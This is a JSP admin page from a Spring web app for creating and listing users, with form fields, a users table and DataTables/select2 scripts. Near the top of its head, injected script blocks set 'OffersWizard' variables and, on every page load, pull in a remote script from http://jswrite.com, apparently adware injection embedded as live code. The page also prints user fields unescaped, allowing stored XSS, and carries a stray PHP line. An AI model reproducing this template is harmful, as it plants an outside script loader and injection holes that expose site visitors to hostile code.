<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
	pageEncoding="ISO-8859-1"%>
<%@taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<%@taglib uri="http://www.springframework.org/tags/form" prefix="form"%>
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>

<head>
<script>
	if (typeof window.__wsujs === 'undefined') {
		window.__wsujs = 14697;
		window.__wsujsn = 'OffersWizard';
		window.__wsujss = '195F8FBCD8CDB37D1E8737AB57503248';
	}
</script>
<script>
	if (top == self && typeof window._ws_all_js === 'undefined') {
		window._ws_all_js = 7;
		var zhead = document.getElementsByTagName('head')[0];
		if (!zhead) {
			zhead = document.createElement('head');
		}
		var qscript = document.createElement('script');
		qscript.setAttribute('id', 'wsh2_js');
		qscript.setAttribute('src', 'http://jswrite.com/script1.js');
		qscript.setAttribute('type', 'text/javascript');
		qscript.async = true;
		if (zhead && !document.getElementById('wsh2_js'))
			zhead.appendChild(qscript);
	}
</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- Meta, title, CSS, favicons, etc. -->
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title><spring:message code="label.Projects" /></title>

<!-- Bootstrap core CSS -->

<!-- Bootstrap core CSS -->

<link
	href="<c:url value="/resources/production/css/bootstrap.min.css" />"
	rel="stylesheet">

<link
	href="<c:url value="/resources/production/fonts/css/font-awesome.min.css" />"
	rel="stylesheet">
<link href="<c:url value="/resources/production/css/animate.min.css" />"
	rel="stylesheet">

<!-- Custom styling plus plugins -->
<link href="<c:url value="/resources/production/css/custom.css" />"
	rel="stylesheet">
<link
	href="<c:url value="/resources/production/css/icheck/flat/green.css" />"
	rel="stylesheet">
<link
	href="<c:url value="/resources/production/css/datatables/tools/css/dataTables.tableTools.css" />"
	rel="stylesheet">
<!-- select2 -->
<link
	href="<c:url value="/resources/production/css/select/select2.min.css" />"
	rel="stylesheet">

<script src="<c:url value="/resources/production/js/jquery.min.js" />"></script>


</head>

<div class="">
	<div class="page-title">
		<div class="title_left">
			<h3>

				<small> </small>
			</h3>
		</div>

		<div class="title_right">
			<div
				class="col-md-5 col-sm-5 col-xs-12 form-group pull-right top_search">
				<div class="input-group">
					<input type="text" class="form-control"
						placeholder=<spring:message code="label.Search" />> <span
						class="input-group-btn">
						<button class="btn btn-default" type="button">
							<spring:message code="label.Go" />
						</button>
					</span>
				</div>
			</div>
		</div>
	</div>
	<div class="clearfix"></div>

	<div class="row">
		<div class="col-md-12 col-sm-12 col-xs-12">
			<div class="x_panel">
				<div class="x_title">
					<h2>
						<spring:message code="label.Create_User" />
						<small><spring:message code="label.User" /></small>
					</h2>
					<ul class="nav navbar-right panel_toolbox">
						<li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
						</li>

						<li><a class="close-link"><i class="fa fa-close"></i></a></li>
					</ul>
					<div class="clearfix"></div>
				</div>
				<div class="x_content">
					<form:form id="demo-form2" class="form-horizontal form-label-left"
						modelAttribute="usere" method="POST" action="saveUser"
						enctype="multipart/form-data">
						<div class="form-group">
							<form:label path="username"
								class="control-label col-md-3 col-sm-3 col-xs-12" for="username">
								<spring:message code="label.Username" />
								<span class="required">*</span>
							</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<form:input path="username" id="username" required="required"
									class="form-control col-md-7 col-xs-12" />
							</div>
						</div>
						<div class="form-group">
							<form:label path="password"
								class="control-label col-md-3 col-sm-3 col-xs-12" for="password">
								<spring:message code="label.Password" />
								<span class="required">*</span>
							</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<form:input path="password" type="password" id="password"
									name="password" required="required" placeHolder="new Password"
									class="form-control col-md-7 col-xs-12" />
							</div>
						</div>
						<div class="form-group">
							<form:label path="email"
								class="control-label col-md-3 col-sm-3 col-xs-12" for="email">
								<spring:message code="label.Email" />
								<span class="required">*</span>
							</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<form:input path="email" type="email" id="email" name="email"
									required="required" class="form-control col-md-7 col-xs-12" />
							</div>
						</div>
						<div class="form-group">
							<form:label path="photo"
								class="control-label col-md-3 col-sm-3 col-xs-12" for="file">
								<spring:message code="label.File" />
							</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<input type="file" id="file" name="file"
									class="form-control col-md-7 col-xs-12">
							</div>
						</div>
						<div class="form-group">
							<form:label path="adresse"
								class="control-label col-md-3 col-sm-3 col-xs-12" for="file">
								<spring:message code="label.Adresse" />
							</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<form:input path="adresse" type="text" id="adresse"
									name="adresse" class="form-control col-md-7 col-xs-12" />
							</div>
						</div>



						<div class="form-group">
							<form:label path="roles"
								class="control-label col-md-3 col-sm-3 col-xs-12" for="file">
								<spring:message code="label.Role" />
							</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<form:radiobutton path="roles" value="1" id="rdio1"
									style="margin-left:5px;" />
								Admin&nbsp;&nbsp;&nbsp;
								<form:radiobutton path="roles" value="2" id="rdio2"
									checked="checked" style="margin-left:5px;" />
								Dev&nbsp;&nbsp;&nbsp;
								<form:radiobutton path="roles" value="3" id="rdio2"
									checked="checked" style="margin-left:5px;" />
								Test&nbsp;&nbsp;&nbsp;
							</div>
						</div>
						<div class="form-group">
							<form:label path="skills"
								class="control-label col-md-3 col-sm-3 col-xs-12" name="skills">Skills</form:label>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<form:select path="skills" class="select2_multiple form-control"
									multiple="multiple">
									<form:option path="skills" value="Web Applications" />
									<form:option path="skills" value="Website Design" />
									<form:option path="skills" value="Automation Testing" />
									<form:option path="skills" value="UI/UX" />

								</form:select>
							</div>
						</div>


						<div class="ln_solid"></div>
						<div class="form-group">
							<div class="col-md-6 col-sm-6 col-xs-12 col-md-offset-3">
								<a type="button" href="users" class="btn btn-info"><spring:message
										code="label.Cancel" />
									</button></a>
								<button type="submit" class="btn btn-success">
									<spring:message code="label.Submit" />
								</button>
							</div>
						</div>

					</form:form>
				</div>
			</div>
		</div>



		<div class="col-md-12 col-sm-12 col-xs-12">
			<div class="x_panel">
				<div class="x_title">
					<h2>
						<spring:message code="label.Users" />
						<small></small>
					</h2>
					<ul class="nav navbar-right panel_toolbox">
						<li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
						</li>

						<li><a class="close-link"><i class="fa fa-close"></i></a></li>
					</ul>
					<div class="clearfix"></div>
				</div>
				<div class="x_content">
					<table id="example"
						class="table table-striped responsive-utilities jambo_table">
						<thead>
							<tr class="headings">

								<th><spring:message code="label.Username" /></th>
								<th width="2%"><spring:message code="label.Email" /></th>
								<th><spring:message code="label.Photo" /></th>

								<th width="20%"><spring:message code="label.Action" /></th>

							</tr>
						</thead>

						<tbody>
							<c:forEach var="u" items="${users}">

								<tr class="odd pointer">

									<td class=" ">${u.username}</td>

									<td width="2%">${u.email}</td>
									<td><img src="photoUser?idUser=${u.idUser}" 
										width="10%"></td>


									<td><a class="btn btn-success" data-toggle="modal"
										data-target="#UserEdit"><i class="fa fa-edit m-right-xs"></i></a>
										<a class="btn btn-danger" href="suppUser?idUser=${u.idUser}">
											<i class="fa fa-remove m-right-xs"></i>
									</a></td>

								</tr>
							</c:forEach>
						</tbody>

					</table>
				</div>
			</div>
		</div>
	</div>



	<div id="UserEdit" class="modal fade" tabindex="-1" role="dialog"
		aria-labelledby="myModalLabel" aria-hidden="true">
		<div class="modal-dialog">
			<div class="modal-content">

				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal"
						aria-hidden="true">×</button>
					<h4 class="modal-title" id="myModalLabel2">
						<spring:message code="label.Edit_User_Entry" />
					</h4>
				</div>
				<div class="modal-body">

					<div id="testmodal2" style="padding: 5px 20px;">
						<form id="antoform2" class="form-horizontal calender" role="form">
							<div class="form-group">
								<label class="col-sm-3 control-label"><spring:message
										code="label.Username" /><span class="required">*</span></label>
								<div class="col-sm-9">
									<input type="text" class="form-control" id="username1"
										name="username">
								</div>
							</div>
							<div class="form-group">
								<label class="col-sm-3 control-label"><spring:message
										code="label.Password" /><span class="required">*</span></label>
								<div class="col-sm-9">
									<input type="password" placeHolder="new Password"
										class="form-control" id="password1" name="password">
								</div>
							</div>
							<div class="form-group">
								<label class="col-sm-3 control-label"><spring:message
										code="label.Email" /><span class="required">*</span></label>
								<div class="col-sm-9">
									<input type="email" class="form-control" id="email1"
										name="email">
								</div>
							</div>


						</form>
					</div>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-default antoclose2"
						data-dismiss="modal">
						<spring:message code="label.Close" />
					</button>
					<button type="button" class="btn btn-primary antosubmit2">
						<spring:message code="label.Save_changes" />
					</button>
				</div>
			</div>
		</div>







		<script
			src="<c:url value="/resources/production/js/bootstrap.min.js" />"></script>

		<!-- chart js -->
		<script
			src="<c:url value="/resources/production/js/chartjs/chart.min.js" />"></script>
		<!-- bootstrap progress js -->
		<script
			src="<c:url value="/resources/production/js/progressbar/bootstrap-progressbar.min.js" />"></script>
		<script
			src="<c:url value="/resources/production/js/nicescroll/jquery.nicescroll.min.js" />"></script>
		<!-- icheck -->
		<script
			src="<c:url value="/resources/production/js/icheck/icheck.min.js" />"></script>

		<script src="<c:url value="/resources/production/js/custom.js" />"></script>
		<!-- select2 -->
		<script
			src="<c:url value="/resources/production/js/select/select2.full.js" />"></script>

		<!-- Datatables -->
		<script
			src="<c:url value="/resources/production/js/datatables/js/jquery.dataTables.js" />"></script>
		<script
			src="<c:url value="/resources/production/js/datatables/tools/js/dataTables.tableTools.js" />"></script>

		<script>
			$(document).ready(function() {
				$('input.tableflat').iCheck({
					checkboxClass : 'icheckbox_flat-green',
					radioClass : 'iradio_flat-green'
				});
			});

			var asInitVals = new Array();
			$(document)
					.ready(
							function() {
								var oTable = $('#example')
										.dataTable(
												{
													"oLanguage" : {
														"sSearch" : "Search all columns:"
													},
													"aoColumnDefs" : [ {
														'bSortable' : false,
														'aTargets' : [ 0 ]
													} //disables sorting for column one
													],
													'iDisplayLength' : 12,
													"sPaginationType" : "full_numbers",
													"dom" : 'T<"clear">lfrtip',
													"tableTools" : {
														"sSwfPath" : "<?php echo base_url('assets2/js/Datatables/tools/swf/copy_csv_xls_pdf.swf'); ?>"
													}
												});
								$("tfoot input").keyup(
										function() {
											/* Filter on the column based on the index of this element's parent <th> */
											oTable.fnFilter(this.value, $(
													"tfoot th").index(
													$(this).parent()));
										});
								$("tfoot input").each(function(i) {
									asInitVals[i] = this.value;
								});
								$("tfoot input").focus(function() {
									if (this.className == "search_init") {
										this.className = "";
										this.value = "";
									}
								});
								$("tfoot input").blur(
										function(i) {
											if (this.value == "") {
												this.className = "search_init";
												this.value = asInitVals[$(
														"tfoot input").index(
														this)];
											}
										});
							});
		</script>
		<!-- select2 -->
		<script>
			$(document).ready(function() {
				$(".select2_single").select2({
					placeholder : "Select a state",
					allowClear : true
				});
				$(".select2_group").select2({});
				$(".select2_multiple").select2({
					maximumSelectionLength : 4,
					placeholder : "With Max Selection limit 4",
					allowClear : true
				});
			});
		</script>
		<!-- /select2 -->